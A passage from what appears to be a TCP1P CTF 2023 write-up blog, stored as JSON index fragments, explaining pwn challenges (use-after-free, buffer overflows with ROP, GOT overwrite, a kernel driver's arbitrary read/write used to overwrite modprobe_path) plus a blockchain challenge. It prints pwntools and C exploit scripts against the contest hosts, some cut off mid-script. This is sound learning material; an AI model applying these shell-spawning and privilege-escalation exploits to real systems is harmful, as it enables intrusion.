we’ve created. There’s a bug in this menu, where after performing free, the stored pointer from the malloc retained in the user_chunk array isn’t cleared. Consequently, even though we’ve deleted that chunk, we can still view its contents later. read_flag int read_flag() { int i; // [rsp+4h] [rbp-Ch] FILE *stream; // [rsp+8h] [rbp-8h] stream = fopen(\"flag.txt\", \"r\"); if ( stream ) { for ( i = 0; i \u003c= 3; ++i ) flag_chunk = (char *)malloc(0x70uLL); flag_chunk = (char *)malloc(0x70uLL); fgets(flag_chunk, 112, stream); fclose(stream); return puts(\"[*] flag loaded into memory\"); } else { puts(\"[!] flag.txt not found\"); return puts(\"[!] if this happened on the remote server, please contact admin.\"); } } This menu will call malloc(0x70) five times and then fill the last malloc chunk with the flag. Based on the information obtained earlier, we see that the bug in the delete menu can be exploited to view the flag’s contents. Note that when a chunk is removed through free, that chunk enters a cache managed by glibc, so the freed chunk can be reused when the program requests malloc again. Given the previously discovered bug in the delete menu, we can exploit it by: Creating chunk five times with a size of 0x70 (the same size as the flag). Deleting them all. There will be five chunks in the cache. Calling read_flag. read_flag will reuse the chunks we’ve previously deleted. Using the view feature to see the contents of these chunks. One of the chunks will contain the flag. Here is the demonstration: nc ctf.tcp1p.com 4267 Menu: (1) create [1-10] (2) delete [","date":"Oct 15, 2023","objectID":"/posts/tcp1p-ctf-2023/:3:1","tags":["Writeup","TCP1P","2023","pwn","blockchain"],"title":"TCP1P CTF 2023","uri":"/posts/tcp1p-ctf-2023/"},{"categories":null,"content":"Game Changer Description Author: itoid Are you a Game Changer? nc ctf.tcp1p.com 9254 ","date":"Oct 15, 2023","objectID":"/posts/tcp1p-ctf-2023/:4:0","tags":["Writeup","TCP1P","2023","pwn","blockchain"],"title":"TCP1P CTF 2023","uri":"/posts/tcp1p-ctf-2023/"},{"categories":null,"content":"Solution We were given a file called gamechanger. Let’s check its mitigation first: Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Only canary is disabled. Now, let’s try to disasemble it: main int __cdecl main(int argc, const char **argv, const char **envp) { unsigned int v4; // [rsp+4h] [rbp-Ch] BYREF int v5; // [rsp+8h] [rbp-8h] unsigned int v6; // [rsp+Ch] [rbp-4h] init(argc, argv, envp); printf(\"Do you want to play a game? (1: Yes, 0: No): \"); while ( (unsigned int)__isoc99_scanf(\"%d\", \u0026v4) != 1 || v4 \u003e 1 ) { while ( getchar() != 10 ) ; printf(\"Invalid choice. Please enter 1 or 0: \"); } while ( getchar() != 10 ) ; if ( v4 ) { if ( v4 == 1 ) { v6 = 1; v5 = 0; while ( (int)v6 \u003c= 5 \u0026\u0026 !v5 ) { printf(\"Attempt %d:\\n\", v6); v5 = game(); ++v6; } if ( v5 ) ask(); else puts(\"You couldn't guess the number. Better luck next time!\"); } } else { puts(\"Okay, maybe another time!\"); } return 0; } game __int64 game() { char s[20]; // [rsp+0h] [rbp-20h] BYREF int num_inp; // [rsp+14h] [rbp-Ch] unsigned int rand_result; // [rsp+18h] [rbp-8h] unsigned int v4; // [rsp+1Ch] [rbp-4h] v4 = 0; rand_result = randomize(); puts(\"Let's play a game, try to guess a number between 1 and 100\"); fgets(s, 16, stdin); num_inp = atoi(s); if ( !num_inp ) { puts(\"That's not a number\"); exit(0); } if ( num_inp == rand_result ) { return 1; } else if ( num_inp \u003e= (int)rand_result ) { printf(\"Nope\"); } else { printf(\"Nope, the number i'm thinking is %d\\n\", rand_result); } return v4; } randomize __int64 randomize() { unsigned int v0; // eax v0 = time(0LL); srand(v0); return (unsigned int)((rand() + 34) % 23); } ask int ask() { char buf[256]; // [rsp+0h] [rbp-100h] BYREF puts(\"Congrats, you guessed it correctly. What do you want to do this morning?\"); read(0, buf, 290uLL); if ( strlen(buf) \u003c= 0x7F ) { puts(\"Oh, are you an introverted person?\"); exit(0); } return printf(\"Oh, you want to %s...\\nWow, you're a very active person!\\n\", buf); } To pass the game, it is very easy to predict the randomize() result because the seed is using current time. Another thing is there is buffer overflow bug in ask. Observed that we can actually get a leak as well from it, considering our input will be printed. Debugging through GDB, we can see that if we try to overwrite the last 2 bytes of stored RIP inside ask function stack, we can actually get a PIE leak + back to ask again to do the buffer overflow again. Notes that overwriting the last 2 bytes required a bit of bruteforce 4 nibbles. After that, I overwrite the stored RIP of ask function stack to main, and then overwrite the stored RIP of main function stack back to ask. The reason here is that, main will insert libc address of atoi+20 near our stored input in ask after observing in GDB. With this, we can get a libc leak, and when the main want to return, it will be back to ask again due to our previous write. Now that we have a libc leak, we can simply overwrite the stored RIP with one_gadget to get a shell. from pwn import * from ctypes import CDLL from ctypes.util import find_library libc_dll = CDLL(find_library(\"c\")) context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") exe = ELF('./gamechanger') libc = ELF('./libc.so.6') # while True: try: libc.address = 0x0 exe.address = 0x0 if args.LOCAL: r = process('./gamechanger') else: r = remote('ctf.tcp1p.com', 9254) # Bypass game check r.sendlineafter(b': ', b'1') r.recvuntil(b'Attempt 1:\\n') libc_dll.srand(libc_dll.time(0)) rand_out = libc_dll.rand() info(f'{rand_out = }') guess = (rand_out + 34) % 23 info(f'{guess = }') r.sendlineafter(b'1 and 100\\n', str(guess).encode()) out = r.recvline() info(f'{out = }') # Bruteforce, overwrite RIP to `ask+1` payload = b'a'*0x108+p16(0x535b) r.send(payload) r.recvuntil(b'want to ') out = u64((r.recvuntil(b'...\\n')[0x108:-4])[:6].ljust(8, b'\\x00')) info(f'{hex(out) = }') exe.address = out - (exe.sym.ask+1) info(f'PIE: {hex(exe.address)}') # Ov","date":"Oct 15, 2023","objectID":"/posts/tcp1p-ctf-2023/:4:1","tags":["Writeup","TCP1P","2023","pwn","blockchain"],"title":"TCP1P CTF 2023","uri":"/posts/tcp1p-ctf-2023/"},{"categories":null,"content":"unsafe safe Description Author: zran So I just turned 17 and decided to make a bank account to deposit my money. This bank stores the money is safes, so it should be safe right? nc ctf.tcp1p.com 1477 ","date":"Oct 15, 2023","objectID":"/posts/tcp1p-ctf-2023/:5:0","tags":["Writeup","TCP1P","2023","pwn","blockchain"],"title":"TCP1P CTF 2023","uri":"/posts/tcp1p-ctf-2023/"},{"categories":null,"content":"Solution In this challenge, we are provided with a source code unsafe.c, along with its binary and the used libc. First, we check the mitigations applied to the binary with checksec. Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: '.' Partial RELRO means we can overwrite the GOT. Now, let’s look at the provided source code: #include \u003cstdio.h\u003e #include \u003cunistd.h\u003e #include \u003cstdlib.h\u003e #include \u003ctime.h\u003e unsigned long safes[100] = {7955998170729676800}; char *exit_message = \"Have a nice day!\"; void init() { setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); } void deposit() { int index = 0; int amount = 0; puts(\"Enter the safe number you want to deposit in (0-100): \"); scanf(\"%d\", \u0026index); puts(\"Enter the amount you want to deposit: \"); scanf(\"%d\", \u0026amount); safes[index] += amount; } void login() { unsigned long age, input, password; char pet_name[5] = \"\\0\\0\\0\\0\\0\"; puts(\"Input your age: \"); scanf(\"%lu\", \u0026age); if (age \u003c 17) { puts(\"Sorry, this is not a place for kids\"); exit(0); } puts(\"Input your pet name: \"); scanf(\"%5c\", pet_name); srand(time(NULL) * (*(short *)pet_name * *(short *)(pet_name + 2) + age)); password = rand(); puts(\"Input your password: \"); scanf(\"%lu\", \u0026input); if (input != password) { puts(\"Password Wrong!\"); exit(0); } } int main() { init(); login(); deposit(); deposit(); deposit(); puts(exit_message); } Looking at the code above, we can identify two bugs: In the login function, the seed used by srand involves the current time along with the pet_name and age variables, which we can control. Therefore, the seed is predictable, and we can easily determine the password value filled in by the rand() result. Thus, we can ensure that we will successfully login and proceed to the next function. In the deposit function, there’s no validation for the index value we input. This results in an Out-of-Bound Write (OOB) relative to the position of the safes array in the line of code safes[index] += amount. Note that the safes array is a global variable, so its position will be in the bss segment. We are given three OOB writes before the program calls puts(exit_message). Based on the above information, with these three OOB writes, one scenario we can do is: With the first write, we can store the string /bin/sh in the safes array. Notice in the code above that safes has an initial value of 7955998170729676800 (a numeral representation of \\x00\\x00\\x00\\x00/bin), which means safes+4 is /bin. We only need to write /sh to safes[1] (safes+8), making the address safes+4 the string /bin/sh. Note that exit_message is a pointer to char. With the second OOB write, we can change its stored value so that its address becomes the address of safes+4. This change will make exit_message the string /bin/sh. Lastly, because of Partial RELRO, we can overwrite the GOT value of puts with the address of system, so when we call puts, what gets invoked is system. If we execute the above scenario, when the program calls puts(exit_message), it will execute system(\"/bin/sh\"). Here is the solver script we used: from pwn import * from ctypes import CDLL from ctypes.util import find_library libc_dll = CDLL(find_library(\"c\")) exe = ELF(\"unsafe_patched\") libc = ELF(\"./libc.so.6\") ld = ELF(\"./ld-linux-x86-64.so.2\") context.binary = exe context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") remote_url = \"ctf.tcp1p.com\" remote_port = 1477 gdbscript = ''' ''' def conn(): if args.LOCAL: r = process([exe.path]) if args.PLT_DEBUG: # gdb.attach(r, gdbscript=gdbscript) pause() else: r = remote(remote_url, remote_port) return r def demangle(val, is_heap_base=False): if not is_heap_base: mask = 0xfff \u003c\u003c 52 while mask: v = val \u0026 mask val ^= (v \u003e\u003e 12) mask \u003e\u003e= 12 return val return val \u003c\u003c 12 def mangle(heap_addr, val): return (heap_addr \u003e\u003e 12) ^ val r = conn() # Login r.sendlineafter(b'age: \\n', b'17') r.sendafter(b'","date":"Oct 15, 2023","objectID":"/posts/tcp1p-ctf-2023/:5:1","tags":["Writeup","TCP1P","2023","pwn","blockchain"],"title":"TCP1P CTF 2023","uri":"/posts/tcp1p-ctf-2023/"},{"categories":null,"content":"NakiriAyame Description Author: HyggeHalcyon Ayame cute noises (✿╹◡╹) https://www.youtube.com/watch?v=XsdQguLgvFc https://www.youtube.com/watch?v=NPMhb_mIIhU nc ctf.tcp1p.com 6666 ","date":"Oct 15, 2023","objectID":"/posts/tcp1p-ctf-2023/:6:0","tags":["Writeup","TCP1P","2023","pwn","blockchain"],"title":"TCP1P CTF 2023","uri":"/posts/tcp1p-ctf-2023/"},{"categories":null,"content":"Solution We were given a binary called ojou. Trying to disassemble it, we noticed that it’s a golang binary, which is statically linked. We didn’t want to check the whole disassembled result, so we just ran the binary, tried some inputs, and sometimes peeked at the disassembled result. nc ctf.tcp1p.com 6666 Who's the cutest vtuber? \u003e\u003e Looking through the disassembly, we saw that we need to respond with Ojou! \u003c3 for the binary to return YES and a gift, which is the address of /bin/sh. This information is somewhat pointless because the binary is statically linked, meaning we already know the address of /bin/sh. Playing around with it, we found that there’s a crash log if we input a bunch of as after the null-terminated string Ojou! \u003c3. Here’s an example of the crash log when we send the input b'Ojou! \u003c3\\x00' + b'a'*0x180: [+] Starting local process './ojou': pid 15303 [*] Switching to interactive mode Who's the cutest vtuber? \u003e\u003e YES Gift for you: *(0x520690) runtime: out of memory: cannot allocate 7016996765295443968-byte block (3899392 in use) fatal error: out of memory goroutine 1 [running]: runtime.throw({0x4988c7?, 0x476d8c?}) /usr/local/go/src/runtime/panic.go:1077 +0x5c fp=0xc0000aeca0 sp=0xc0000aec70 pc=0x4308fc runtime.(*mcache).allocLarge(0x1a?, 0x6161616161616161, 0x1?) /usr/local/go/src/runtime/mcache.go:236 +0x176 fp=0xc0000aece8 sp=0xc0000aeca0 pc=0x412db6 runtime.mallocgc(0x6161616161616161, 0x0, 0x0) /usr/local/go/src/runtime/malloc.go:1123 +0x4f6 fp=0xc0000aed50 sp=0xc0000aece8 pc=0x40b956 runtime.slicebytetostring(0xc0000aef77?, 0x6161616161616161, 0x6161616161616161) /usr/local/go/src/runtime/string.go:112 +0x77 fp=0xc0000aed80 sp=0xc0000aed50 pc=0x44a1b7 main.main() /home/kali/Desktop/kirakira/main.go:37 +0x2e7 fp=0xc0000aef40 sp=0xc0000aed80 pc=0x47ddc7 runtime: g 1: unexpected return pc for main.main called from 0x6161616161616161 Based on the error message, we concluded that there’s a buffer overflow, and we could probably do ROP to call execve(\"/bin/sh\", 0, 0). After some experimentation to find the appropriate offset, we discovered that we need to add 0x141 characters after Ojou! \u003c3\\x00 to start affecting the PC. So, the next step was just to locate the suitable gadgets with the assistance of ROPGadget, and then carry out the ROP. Below is the complete script that we used: from pwn import * r = remote('ctf.tcp1p.com', 6666) pop_rax_rbp = 0x004723ca pop_rdi = 0x004726a4 pop_rdx = 0x00479d7a syscall = 0x00465b2d vtuber = b'Ojou! \u003c3\\x00' # ROP to trigger execve(\"/bin/sh\", 0, 0) payload = b'\\x00'*1 payload += b'\\x00'*(0x140) payload += p64(pop_rdx) payload += p64(0) payload += p64(pop_rax_rbp) payload += p64(0x400160) # Set [rax] to 0 payload += p64(0) payload += p64(pop_rdi) payload += p64(0x497d19) payload += p64(pop_rax_rbp) payload += p64(0x3b) payload += p64(0) payload += p64(syscall) r.sendlineafter(b'\u003e\u003e ', vtuber+payload) r.interactive() Running the script, we got the shell: [+] Opening connection to ctf.tcp1p.com on port 6666: Done [*] Switching to interactive mode YES Gift for you: *(0x520690) Ayame cuteeee$ cat flag.txt TCP1P{Ojou_sama_no_giggles_cuteness_overload_kawayoooooo!} Flag: TCP1P{Ojou_sama_no_giggles_cuteness_overload_kawayoooooo!} ","date":"Oct 15, 2023","objectID":"/posts/tcp1p-ctf-2023/:6:1","tags":["Writeup","TCP1P","2023","pwn","blockchain"],"title":"TCP1P CTF 2023","uri":"/posts/tcp1p-ctf-2023/"},{"categories":null,"content":"Digital Circuit Description Author: zran Hi, I’m back again. Should be easier this time around. (just an extra pwn chall since there’s still a lot of time left) nc ctf.tcp1p.com 1470 ","date":"Oct 15, 2023","objectID":"/posts/tcp1p-ctf-2023/:7:0","tags":["Writeup","TCP1P","2023","pwn","blockchain"],"title":"TCP1P CTF 2023","uri":"/posts/tcp1p-ctf-2023/"},{"categories":null,"content":"Solution We were provided with a binary called teleport. Initially, we examine the security mitigations applied to the binary using checksec. Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Let’s check the disassembly result: cool_thing1 unsigned __int64 __fastcall cool_thing1(__int64 a1, int a2, int a3, int a4, int a5, int a6) { int v6; // ecx int v7; // r8d int v8; // r9d unsigned __int64 v10; // [rsp+8h] [rbp-18h] BYREF unsigned __int64 v11; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v12; // [rsp+18h] [rbp-8h] v12 = __readfsqword(0x28u); printf((unsigned int)\"Give me two special numbers:\\n\u003e \", a2, a3, a4, a5, a6); _isoc99_scanf((unsigned int)\"%lu %lu\", (unsigned int)\u0026v10, (unsigned int)\u0026v11, v6, v7, v8); if ( v10 == v11 ) { puts(\"Different numbers please!\"); } else if ( v10 \u003e= 0x80000000 \u0026\u0026 v11 \u003e= 0x80000000 ) { if ( (_DWORD)v10 == (_DWORD)v11 ) { puts(\"\\nCongrats! Can you explain what's happening here?\"); read(0LL, \u0026anu, 0x10LL); cool_thing2(); } else { puts(\"Wrong!\"); } } else { puts(\"Too small!\"); } return v12 - __readfsqword(0x28u); } Reviewing the source code, we see that to bypass the check, we only need to ensure the lower four bytes of our input are the same, while the upper four bytes are different. cool_thing2 unsigned __int64 __fastcall cool_thing2(__int64 a1, int a2, int a3, int a4, int a5, int a6) { int v6; // ecx int v7; // r8d int v8; // r9d __int64 v10; // [rsp+0h] [rbp-40h] BYREF __int64 v11; // [rsp+8h] [rbp-38h] BYREF char v12[40]; // [rsp+10h] [rbp-30h] BYREF unsigned __int64 v13; // [rsp+38h] [rbp-8h] v13 = __readfsqword(0x28u); printf((unsigned int)\"\\nGive me another two special numbers:\\n\u003e \", a2, a3, a4, a5, a6); _isoc99_scanf((unsigned int)\"%ld %ld\", (unsigned int)\u0026v10, (unsigned int)\u0026v11, v6, v7, v8); if ( v10 == v11 ) { puts(\"Different numbers please!\"); } else if ( (float)(int)v10 == *(float *)\u0026v11 ) { ((void (*)(void))cool_thing3)(); puts(\"\\nWell done hero! What's your name?\"); read(0LL, v12, 0x40LL); } else { puts(\"Wrong!\"); } return v13 - __readfsqword(0x28u); } To bypass the above check, we can simply use gdb to determine the casting result of our input v10, then convert that casting result to hex and use it as the v11 value. Note that there is a buffer overflow in v12. cool_thing3 unsigned __int64 __fastcall cool_thing3(__int64 a1, int a2, int a3, int a4, int a5, int a6) { int v6; // ecx int v7; // r8d int v8; // r9d int v9; // edx int v10; // ecx int v11; // r8d int v12; // r9d double v14; // [rsp+0h] [rbp-20h] BYREF double v15; // [rsp+8h] [rbp-18h] BYREF char v16[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v17; // [rsp+18h] [rbp-8h] v17 = __readfsqword(0x28u); printf((unsigned int)\"\\nGive me one final pair of special numbers:\\n\u003e \", a2, a3, a4, a5, a6); _isoc99_scanf((unsigned int)\"%lf %lf\", (unsigned int)\u0026v14, (unsigned int)\u0026v15, v6, v7, v8); if ( v14 == v15 ) { puts(\"Different numbers please!\"); } else if ( LODWORD(v14) == LODWORD(v15) ) { puts(\"\\nHorray! Here's a present for you, if you need it...\"); printf((unsigned int)\"%ld\\n\", v17, v9, v10, v11, v12); read(0LL, v16, 0x19LL); } else { puts(\"Wrong!\"); } return v17 - __readfsqword(0x28u); } To bypass the above check, we can actually re-use the number that we used to bypass cool_thing1. However, we need to convert the hex to its double representation first. Note that there is a buffer overflow bug here as well. Additionally, this function provides us with a canary leak. The challenge here is, with the limited size of the overflow we can perform, we need to execute a ROP to spawn a shell. Now that we’re aware of all the bugs, we need to devise a strategy for exploitation. Our approach is as follows: Write /bin/sh to anu during cool_thing1. Bypass cool_thing2. Bypass cool_thing3. And with the buffer overflow: Pivot RBP to the bss area (let’s refer to it as new_rbp). Return to cool_thing2, where we have a second buffer overflow with a much larger size. Here’s what we do: We place ","date":"Oct 15, 2023","objectID":"/posts/tcp1p-ctf-2023/:7:1","tags":["Writeup","TCP1P","2023","pwn","blockchain"],"title":"TCP1P CTF 2023","uri":"/posts/tcp1p-ctf-2023/"},{"categories":null,"content":"💀 Description Author: hyffs Let him cook nc ctf.tcp1p.com 10000 ","date":"Oct 15, 2023","objectID":"/posts/tcp1p-ctf-2023/:8:0","tags":["Writeup","TCP1P","2023","pwn","blockchain"],"title":"TCP1P CTF 2023","uri":"/posts/tcp1p-ctf-2023/"},{"categories":null,"content":"Solution We were given a zip file containing a kernel image bzImage and initramfs.cpio.gz. First, let’s unpack the initramfs.cpio.gz to extract the kernel driver. The kernel driver is located in /lib/modules/6.1.56/cook.ko. Let’s disassemble the driver. The only function that is interesting is the gyattt_ioctl. __int64 __fastcall gyattt_ioctl(__int64 a1, int a2, __int64 a3) { __int64 v5; // rsi __int64 v6; // rsi __int64 v7; // [rsp+0h] [rbp-20h] BYREF __int64 v8; // [rsp+8h] [rbp-18h] unsigned __int64 v9; // [rsp+10h] [rbp-10h] v9 = __readgsqword(0x28u); if ( a2 == 0x6969 ) { if ( copy_from_user(\u0026v7, a3, 0x10LL) ) { printk(\u0026unk_1AE, a3); return -14LL; } else { v6 = v8; if ( !copy_to_user(a3, v8, 8LL) ) return 0LL; printk(\u0026unk_1CB, v6); return -14LL; } } else { if ( a2 != 0xFADE ) return 0LL; if ( copy_from_user(\u0026v7, a3, 16LL) ) { return ((__int64 (*)(void))gyattt_ioctl_cold)(); } else { v5 = v8; if ( !copy_from_user(v7, v8, 8LL) ) return 0LL; printk(\u0026unk_204, v5); return -14LL; } } } Looking through the code, we can identify two actions when interacting with the given driver via ioctl: By using the magic number 0x6969, we can read any value from a specified address. With the magic number 0xFADE, we’re able to write any value to our chosen address. The operation follows the format ioctl(driver_fd, magic_number, \u0026buf), where buf is the value we want to set (restricted to 8 bytes and only during write operations), and buf+8 is the kernel address we aim to read or write. Given the arbitrary read and write capabilities provided by the driver, crafting an exploit becomes quite straightforward. Our primary goal is to overwrite the modprobe_path with a custom malicious script, enabling us to escalate privileges to root. It’s important to note that the kernel’s ASLR space is relatively limited. Therefore, with the arbitrary read function, we can actually brute-force the possible kernel_base addresses. Here’s how: We scan the kernel memory, starting from 0xffffffff81000000 and ending at 0xffffffffc0000000, incrementing by 0x100000. Attempt to read the value at curr_addr+modprobe_path_offset with the arbitrary read. If the retrieved value begins with /sbin/m (8 bytes), we’ve successfully recovered the kernel_base. Next, using the arbitrary write, we overwrite this path with our malicious script. Below is the exploit script we used: #define _GNU_SOURCE #include \u003cfcntl.h\u003e #include \u003cstdint.h\u003e #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e #include \u003cinttypes.h\u003e #include \u003csys/ioctl.h\u003e #include \u003csys/msg.h\u003e #include \u003csys/shm.h\u003e #include \u003csys/stat.h\u003e #include \u003csys/syscall.h\u003e #include \u003csys/socket.h\u003e #include \u003csys/types.h\u003e #include \u003clinux/userfaultfd.h\u003e #include \u003csys/resource.h\u003e #include \u003cpthread.h\u003e #include \u003csys/mman.h\u003e #include \u003cpoll.h\u003e #include \u003ctime.h\u003e #include \u003cunistd.h\u003e void fatal(const char *msg) { perror(msg); exit(1); } // Helper method during debugging void print_data(char *buf, size_t len) { // Try to print data for (int i = 0; i \u003c len; i += 8) { char* fmt_str; if ((i / 8) % 2 == 0) { fmt_str = \"0x%04x: 0x%016lx\"; printf(fmt_str, i, *(unsigned long*)\u0026buf[i]); } else { fmt_str = \" 0x%016lx\\n\"; printf(fmt_str, *(unsigned long*)\u0026buf[i]); } } puts(\"\"); } int main() { puts(\"Hello World!\"); int fd = open(\"/dev/cook\", O_RDWR); char buf[0x10] = { 0 }; // Try to find where is /sbin/modprobe unsigned long modprobe_path = 0x0; for (unsigned long addr = 0xffffffff81000000; addr \u003c= 0xffffffffc0000000; addr+=0x100000) { unsigned long *p = (unsigned long*)\u0026buf; *p++ = 0; *p++ = addr + 0x1852420; ioctl(fd, 0x6969, \u0026buf); char *pos = strstr(buf, \"/sbin/m\"); if (pos) { modprobe_path = addr + 0x1852420; printf(\"FOUND modprobe: 0x%016lx\\n\", modprobe_path); break; } } // Overwrite modprobe unsigned long *p = (unsigned long*)\u0026buf; char ez[0x8] = \"/home/bl\"; *p++ = modprobe_path; *p++ = (unsigned long)\u0026ez; ioctl(fd, 0xFADE, \u0026buf); p = (unsigned long*)\u0026buf; char ez2[0x8] = \"ud/ez\\x00\"; *p++ = modprobe_path+0x8; *p++ = (unsigned long)\u0026ez2; ioctl(fd","date":"Oct 15, 2023","objectID":"/posts/tcp1p-ctf-2023/:8:1","tags":["Writeup","TCP1P","2023","pwn","blockchain"],"title":"TCP1P CTF 2023","uri":"/posts/tcp1p-ctf-2023/"},{"categories":null,"content":"tickery Description Author: yqroo is this pwn chall? nc ctf.tcp1p.com 49999 ","date":"Oct 15, 2023","objectID":"/posts/tcp1p-ctf-2023/:9:0","tags":["Writeup","TCP1P","2023","pwn","blockchain"],"title":"TCP1P CTF 2023","uri":"/posts/tcp1p-ctf-2023/"},{"categories":null,"content":"Solution In this challenge, we were given a binary called main and libc.so.6. Let’s start by disassemble the binary. main int __cdecl __noreturn main(int argc, const char **argv, const char **envp) { int v3; // [rsp+1Ch] [rbp-14h] BYREF __int64 v4; // [rsp+20h] [rbp-10h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); init(argc, argv, envp); seccomp_rules(argc); puts(\"ticket??\"); while ( 1 ) { while ( 1 ) { menu(); printf(\"\u003e \"); __isoc99_scanf(\"%d%*c\", \u0026v3); if ( v3 != 3 ) break; v4 = ticketid(prompt); refund(v4); } if ( v3 \u003e 3 ) break; if ( v3 == 1 ) { v4 = ticketid(prompt); order(v4); } else { if ( v3 != 2 ) break; v4 = ticketid(prompt); verify(v4); } } puts(\"nono\\n\"); _exit(0); } order ssize_t __fastcall order(__int64 a1) { *((_QWORD *)\u0026TICKET + a1) = malloc(0x20uLL); printf(\"Name : \"); return read(0, *((void **)\u0026TICKET + a1), 0x20uLL); } verify unsigned __int64 __fastcall verify(__int64 a1) { void *v1; // rsp __int64 v3; // [rsp+8h] [rbp-40h] BYREF __int64 v4; // [rsp+10h] [rbp-38h] __int64 v5; // [rsp+20h] [rbp-28h] void *buf; // [rsp+28h] [rbp-20h] unsigned __int64 v7; // [rsp+30h] [rbp-18h] v4 = a1; v7 = __readfsqword(0x28u); v5 = 31LL; v1 = alloca(32LL); buf = \u0026v3; if ( *((_QWORD *)\u0026TICKET + a1) ) { puts(\"Please Confirm !\"); printf(\"Your seat %lu\\n\", v4); printf(\"please say your name for confirmation : \"); read(0, buf, 0x20uLL); sub_1450((const char *)buf); if ( !strcmp(*((const char **)\u0026TICKET + v4), (const char *)buf) ) { puts(\"This ticket has been verified, for your own safety please change the ticket name\"); printf(\"New name : \"); read(0, *((void **)\u0026TICKET + v4), 0x20uLL); } else { printf(\"Sorry sir this ticket belongs to %s\", *((const char **)\u0026TICKET + v4)); *((_QWORD *)\u0026TICKET + v4) = 0LL; } } else { puts(\"This seat is available, you are free to order this one\"); } return v7 - __readfsqword(0x28u); } refund int __fastcall refund(__int64 a1) { if ( !*((_QWORD *)\u0026TICKET + a1) ) return puts(\"This seat is available, you are free to order this one\"); free(*((void **)\u0026TICKET + a1)); return puts(\"ok\"); } Reviewing the provided code, we summarize its functionality as follows: order: Creates a new ticket with a fixed chunk size of 0x20, which is not under our control. verify: Allows editing of an existing ticket. refund: Deletes a ticket. Additionally, the binary has seccomp restrictions enforcing that only open, read, and write syscalls are permissible, eliminating the possibility of spawning a shell. We’ve identified a Use-After-Free vulnerability in the refund function, where the TICKET structure isn’t cleared post-deletion. With this insight, our exploitation strategy encompasses the following steps: Leak the heap address by exploiting the Use-After-Free vulnerability, allowing us to gather valuable information about memory layout. Leak the libc address, essential for bypassing ASLR and potentially manipulating function pointers within libc. Leak the stack address to understand the precise stack layout, preparing for a potential Return-Oriented Programming (ROP) exploit. Execute the open-read-write sequence, as these are the only syscalls allowed, focusing our exploit path. This strategy doesn’t involve spawning a shell but rather reading sensitive information or writing our payload into executable memory. Leak libc address Typically, we might leak a libc address by filling up the tcache for large-size chunks. However, our limitation is that we can only invoke malloc(0x20). This constraint led us to the following strategy: Engage in tcache poisoning, allowing us to redirect our new chunk towards the tcache metadata (which is located in the start of the heap area). We aim for the count metadata corresponding to each bin size. Then, we adjust the count to 7 to max it out. In this challenge, I adjusted the 0xc0 size counter to 7. Subsequently, we perform another tcache poisoning to create a new chunk that overlaps an existing chunk header. We overwrite the chunk size to 0xc0. Upon freeing it, the c","date":"Oct 15, 2023","objectID":"/posts/tcp1p-ctf-2023/:9:1","tags":["Writeup","TCP1P","2023","pwn","blockchain"],"title":"TCP1P CTF 2023","uri":"/posts/tcp1p-ctf-2023/"},{"categories":null,"content":"Venue Description Author: Kiinzu Look at the Amazing Party Venue So do you wish to enter? contract: 0x1AC90AFd478F30f2D617b3Cb76ee00Dd73A9E4d3 provider: https://eth-sepolia.g.alchemy.com/v2/SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8 Priv-Key: Please use your own private-key, if you need ETH for transact, You can either DM the Author, or get it by yourself at https://sepoliafaucet.com/ ","date":"Oct 15, 2023","objectID":"/posts/tcp1p-ctf-2023/:10:0","tags":["Writeup","TCP1P","2023","pwn","blockchain"],"title":"TCP1P CTF 2023","uri":"/posts/tcp1p-ctf-2023/"},{"categories":null,"content":"Solution In this challenge, we were given two files called Venue.sol and 101.txt. Another thing is that in the challenge description, we also given the provider and contract address. Looking through the Venue.sol: // SPDX-License-Identifier: MIT pragma solidity ^0.8.13; contract Venue{ string private flag; string private message; constructor(string memory initialFlag, string memory initialMessage){ flag = initialFlag; message = initialMessage; } function enterVenue() public view returns(string memory){ return flag; } function goBack() public view returns(string memory){ return message; } } Looking through the above source code, we can see that the deployed contract has a public method called enterVenue(), which will return the flag. In EVM, there are two kind of invocation that we can do to interact with a contract: call A read-only operation that executes a contract function locally without altering the blockchain state. It’s used to query or test functions and doesn’t require gas since it doesn’t create a transaction on the blockchain. transaction A write operation that alters the blockchain state (such as updating variables, transferring ETH, or contract deployment). It requires gas and confirmation by the network, and the changes are permanently recorded on the blockchain. Observed that for this challenge, we don’t actually need to do any write operation, as the goal is to call the enterVenue() function. Hence, we do not need any private key to do it. We can use the help of foundry to interact with the contract (Installation can be found in here). Below is the command that we can use to call the enterVenue() function. cast call 0x1AC90AFd478F30f2D617b3Cb76ee00Dd73A9E4d3 \"enterVenue()\" -r https://eth-sepolia.g.alchemy.com/v2/SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002c54435031507b64305f336e6a30795f7468335f70347274795f6275375f3472335f7930755f345f5649503f7d0000000000000000000000000000000000000000 As you can see, we received a hex response from the call, which will be decoded into a flag. Simply decode it using your favourite tool. In [2]: bytes.fromhex('0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002c54435031507b64305f336e6a3 ...: 0795f7468335f70347274795f6275375f3472335f7930755f345f5649503f7d0000000000000000000000000000000000000000') Out[2]: b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 